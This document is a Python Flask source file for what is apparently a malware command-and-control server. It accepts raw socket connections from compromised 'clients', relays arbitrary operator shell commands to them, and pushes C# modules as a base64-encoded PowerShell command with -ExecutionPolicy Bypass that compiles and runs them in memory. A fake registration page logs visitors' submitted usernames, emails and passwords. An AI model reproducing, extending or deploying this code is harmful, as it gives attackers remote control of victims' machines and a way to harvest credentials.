import argparse
import threading
import socket
import uuid
import time
import os
import base64
from flask import Flask, jsonify, render_template, request, abort, Response, redirect, url_for, session, flash, g
import json
import re
from functools import wraps
import secrets
import logging
from logging.handlers import RotatingFileHandler

# ——————— APP SETUP ———————
app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=False,
    SESSION_COOKIE_SAMESITE='Lax',
)

# ——————— LOGGING SETUP ———————
logger = logging.getLogger('c2_logger')
logger.setLevel(logging.DEBUG)

file_handler = RotatingFileHandler(
    'activity.log', maxBytes=1_000_000, backupCount=3, encoding='utf-8'
)
file_handler.setFormatter(logging.Formatter(
    '%(asctime)s | %(levelname)-8s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
))
file_handler.setLevel(logging.DEBUG)
logger.addHandler(file_handler)

console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s | %(levelname)-8s | %(message)s'))
console_handler.setLevel(logging.INFO)
logger.addHandler(console_handler)

# Log all non-GET HTTP requests
@app.before_request
def before_request():
    g.start_time = time.time()
    if request.method != 'GET':
        remote = request.headers.get('X-Forwarded-For', request.remote_addr)
        logger.info(f"HTTP {request.method} request to {request.path} from {remote}")

@app.after_request
def after_request(response):
    duration = time.time() - g.start_time if hasattr(g, 'start_time') else 0
    if request.method != 'GET':
        logger.info(f"HTTP {request.method} {request.path} -> {response.status_code} ({duration:.3f}s)")
    return response

# Credentials
USERNAME = os.getenv('DASH_USER', 'admin')
PASSWORD = os.getenv('DASH_PASS', 'secret')

# In-memory client registry
devices = {}
MODULES_DIR = 'modules'
modules = {}
registry_lock = threading.Lock()

# Authentication decorator

def login_required(f):
    @wraps(f)
    def decorated_view(*args, **kwargs):
        if not session.get('logged_in'):
            logger.warning(f"Unauthorized access attempt to {request.path} from {request.remote_addr}")
            return redirect(url_for('login', next=request.path))
        return f(*args, **kwargs)
    return decorated_view

@app.route('/login', methods=('GET', 'POST'))
def login():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if request.method == 'POST':
        user = request.form.get('username')
        pw   = request.form.get('password')
        logger.info(f"LOGIN ATTEMPT — IP: {ip} | user={user!r}")
        if user == USERNAME and pw == PASSWORD:
            session.clear()
            session['logged_in'] = True
            logger.info(f"LOGIN SUCCESS — IP: {ip} | user={user!r}")
            return redirect(request.args.get('next') or url_for('index'))
        else:
            logger.warning(f"LOGIN FAILED — IP: {ip} | user={user!r}")
            flash('Invalid username or password', 'danger')
    return render_template('login.html')

@app.route('/logout')
def logout():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    session.clear()
    logger.info(f"LOGOUT — IP: {ip}")
    flash('You have been logged out', 'info')
    return redirect(url_for('login'))

# Load modules metadata
def load_modules():
    logger.info("Loading modules from %s", MODULES_DIR)
    for fn in os.listdir(MODULES_DIR):
        if fn.lower().endswith('.cs'):
            path = os.path.join(MODULES_DIR, fn)
            raw = open(path, 'rb').read().decode('utf-8', errors='ignore')
            m = re.match(r'/\*\s*(\{.*?\})\s*\*/', raw, re.S)
            meta = json.loads(m.group(1)) if m else {}
            name = meta.get('name', os.path.splitext(fn)[0])
            modules[name] = {'path': path, 'meta': meta}
            logger.debug(f"Module loaded: {name} => {path}")

load_modules()

@app.route('/')
@login_required
def index():
    return render_template('index.html')

@app.route('/register', methods=('GET','POST'))
def register():
    if request.method == 'POST':
        data = {k: request.form.get(k) for k in ('username','email','password','confirm')}
        ip   = request.headers.get('X-Forwarded-For', request.remote_addr)
        logger.info(f"REGISTER ATTEMPT — IP: {ip} | data={data}")
        flash('Account creation is currently disabled. Please contact admin.', 'warning')
        return redirect(url_for('login'))
    return render_template('gottem.html')

@app.route('/client/<cid>')
@login_required
def client_view(cid):
    with registry_lock:
        if cid not in devices:
            logger.error(f"Client view requested for unknown cid={cid}")
            abort(404)
    return render_template('client.html', client_id=cid)

@app.route('/modules')
@login_required
def list_modules():
    logger.info("Listing modules for dashboard")
    out = []
    for name, info in modules.items():
        md = info.get('meta', {})
        out.append({
            'name': name,
            'desc': md.get('desc', ''),
            'author': md.get('author', ''),
            'version': md.get('version', ''),
            'args': md.get('args', [])
        })
    return jsonify(out)

@app.route('/clients')
@login_required
def clients():
    with registry_lock:
        data = [
            {
                'id': cid,
                'addr': f"{info['addr'][0]}:{info['addr'][1]}",
                'connected_at': info['connected_at'],
                'last_seen': info.get('last_seen', info['connected_at']),
                'bytes_received': info.get('bytes_received', 0)
            }
            for cid, info in devices.items()
        ]
    return jsonify(data)

@app.route('/client/<cid>/module', methods=['POST'])
def run_module(cid):
    data = request.json or {}
    mod = data.get('module')
    args = data.get('args', [])
    logger.info(f"Module dispatch requested: client={cid}, module={mod}, args={args}")
    if mod not in modules:
        logger.error(f"Requested unknown module '{mod}' for client {cid}")
        abort(404)
    path = modules[mod]['path']
    with open(path, 'rb') as f:
        payload = base64.b64encode(f.read()).decode()
    ps = (
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
        f"$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{payload}'));"
        f"Add-Type -TypeDefinition $code -Language CSharp -ReferencedAssemblies System.Windows.Forms,System.Drawing;"
        f"[Module]::Run(@({','.join(repr(a) for a in args)}))"
    )
    with registry_lock:
        if cid not in devices:
            logger.error(f"Attempt to run module on non-existent client {cid}")
            abort(404)
        devices[cid]['sock'].sendall(ps.encode() + b'\n')
    logger.info(f"Module {mod} dispatched to client {cid}")
    return ('', 204)

@app.route('/client/<cid>/cmd', methods=['POST'])
def client_cmd(cid):
    cmd = request.json.get('cmd')
    if not cmd:
        logger.warning(f"Empty command sent to client {cid}")
        abort(400)
    logger.info(f"Sending command to client {cid}: {cmd!r}")
    with registry_lock:
        if cid not in devices:
            logger.error(f"Command sent to unknown client {cid}")
            abort(404)
        conn = devices[cid]['sock']
    try:
        conn.sendall(cmd.encode() + b"\n")
        return ('', 204)
    except Exception as e:
        logger.error(f"Error sending cmd to {cid}: {e}")
        abort(500)

@app.route('/client/<cid>/stream')
def stream(cid):
    def generate():
        last_idx = 0
        while True:
            time.sleep(0.5)
            with registry_lock:
                info = devices.get(cid)
                if not info:
                    logger.info(f"Stream closed for client {cid}")
                    yield 'event: close\ndata: [DISCONNECTED]\n\n'
                    break
                buf = info['buffer']
            if last_idx < len(buf):
                for line in buf[last_idx:]:
                    yield f"data: {line}\n\n"
                last_idx = len(buf)
    logger.info(f"Starting event stream for client {cid}")
    return Response(generate(), mimetype='text/event-stream')

# Client-handler thread
def handle_client(cid, conn):
    logger.info(f"Client handler started for {cid}")
    try:
        with conn:
            while True:
                line = conn.recv(4096)
                if not line:
                    break
                text = line.decode(errors='ignore').rstrip()
                logger.debug(f"Received from {cid}: {text}")
                with registry_lock:
                    devices[cid]['buffer'].append(text)
                    devices[cid]['last_seen'] = time.strftime("%Y-%m-%d %H:%M:%S")
                    devices[cid]['bytes_received'] += len(line)
    except Exception as e:
        logger.error(f"Error in handle_client({cid}): {e}")
    finally:
        with registry_lock:
            devices.pop(cid, None)
        logger.info(f"Client {cid} disconnected and cleaned up")

# Listener thread
def listener(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(5)
    logger.info(f"Listening for clients on {host}:{port}")
    while True:
        conn, addr = sock.accept()
        cid = uuid.uuid4().hex[:8]
        with registry_lock:
            devices[cid] = {
                'sock': conn,
                'addr': addr,
                'connected_at': time.strftime("%Y-%m-%d %H:%M:%S"),
                'buffer': [],
                'last_seen': time.strftime("%Y-%m-%d %H:%M:%S"),
                'bytes_received': 0
            }
        logger.info(f"New client {cid} connected from {addr}")
        threading.Thread(target=handle_client, args=(cid, conn), daemon=True).start()

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('--listen-host', default='0.0.0.0')
    p.add_argument('--listen-port', type=int, required=True)
    p.add_argument('--web-port', type=int, default=8000)
    args = p.parse_args()

    threading.Thread(target=listener, args=(args.listen_host, args.listen_port), daemon=True).start()
    logger.info(f"Starting Flask web server on 0.0.0.0:{args.web_port}")
    app.run(host='0.0.0.0', port=args.web_port, debug=False)
